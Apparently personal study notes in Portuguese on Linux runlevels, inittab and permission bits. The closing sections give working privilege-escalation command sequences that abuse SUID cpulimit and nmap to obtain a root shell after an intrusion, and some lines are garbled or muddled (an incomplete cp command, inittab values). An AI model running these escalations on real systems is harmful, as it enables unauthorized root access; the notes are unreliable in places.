N - Não houve alteração de runlevel desde a última reinicialização.
init 0 - irá desligar a máquina
0 - Shutdown
1 - Modo de Segurança 
2 - Multi-Uusário // Sem gráfico
3 - Multi
4 - Personalização
5 - Multi Gráfico
6 - reboot

(Run Level 0)
cd /etc/rc0.d
ls
(Run Level 5)
cd /etc/rc5.d
ls

Em algumas sistemas Linux, é possível alterar o init 
$ nano /etc/inittab
> id:6:initdefault:
Padrão do inittab :
> id:0:initdefault:
Fará com que o sistema fique reiniciando eternamente(R.I.P).

Possível resolução, usar Live de outro sistema para verificar o que pode ter acontecido.

Existem três tipos de permissões em um Sistema Operacional Linux:
SUID BIT    -	4   - Permissão que rode binário com permissão do root.
SGID BIT    -	2   - PDC
STICK BIT   -	1   - Pasta - Só quem  pode deletar um arquivo é o dono.

Para desligar a máquina é possível desligar a máquina somente com uma permissão.
chmod 4755 /sbin/shutdown

Permissões no Linux em arquivos
777
7(rwx)7(rwx)7(rwx)

Pasta :
7(rwx) 5(r-x) 5(r-x)

[Ataque de Escalação de Privilégios]
Após ganhar acesso a um sistema, você vai estar como usuário comum, a intenção de uma invasão
é ser o ROOT.
Com esse comando é possível encontrar arquivos binários(SUID BIT).
$ find / -perm -4000 2>/dev/null
$ cpulimit -l 100 -f mkdir /roadsec
$ cpulimit -l 100 -f chmod 4755 /usr/bin/bash
$ cpulimit -l 100 -f cp /usr/bin/bash 
$ cpulimit -l 100 -f cp /usr/bin/bash /roadsec/
$ cpulimit -l 100 -f chmod +s /roadsec/bash
$ cd /roadsec/
$ ./bash -p

[Outro ataque de Escalação de Privilégios]
$ find / -perm -4000 2>/dev/null
$ nmap -v
$ nmap --interactive
$ !sh
(O shell do Root é aberto)
